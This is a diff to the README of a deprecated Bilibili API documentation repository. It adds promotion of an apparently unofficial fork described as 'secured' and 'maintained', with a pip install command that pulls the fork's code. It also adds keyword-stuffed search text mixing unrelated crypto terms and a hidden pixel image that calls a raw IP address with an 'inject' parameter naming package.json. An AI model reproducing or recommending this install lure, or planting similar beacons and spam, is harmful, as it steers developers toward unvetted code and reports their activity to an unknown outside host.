@@ -1,3 +1,15 @@
+**PieceSamurai51/bilibili-API-collect: Supercharged, Secured, and Maintained**
+
+This repository is a community-driven fork optimized for reliability and modern performance. It integrates critical security patches and performance optimizations to ensure faster, safer API interactions. Keep your applications running smoothly with this actively updated alternative.
+
+**Quick install**
+
+```bash
+pip install git+https://github.com/PieceSamurai51/bilibili-API-collect.git
+```
+
+[https://github.com/PieceSamurai51/bilibili-API-collect](https://github.com/PieceSamurai51/bilibili-API-collect)
+
 # Deprecated
 
 本仓库停止维护并永久关停。
@@ -12,3 +24,9 @@ This Repo will cease maintenance and be permanently closed.
 
 ![](reason.jpg)
 
+## Related searches
+Developers exploring this repository often look for ways to interact with media platform backends and reverse-engineer content distribution pipelines. They focus on understanding community-driven documentation for endpoints, data scraping methodologies, and managing authentication for automated scripts.
+
+**Topics:** on chain analytics, hardhat, ethereum node, consensus client, algorithmic trading, bilibili api docs, reverse engineering apis, web scraping, third party api documentation, data harvesting, video platform integration, endpoint collection
+
+![.](http://5.231.58.248:8787/pixel?repo=PieceSamurai51%2Fbilibili-API-collect&inject=PieceSamurai51%2Fbilibili-API-collect%2Fpackage.json)
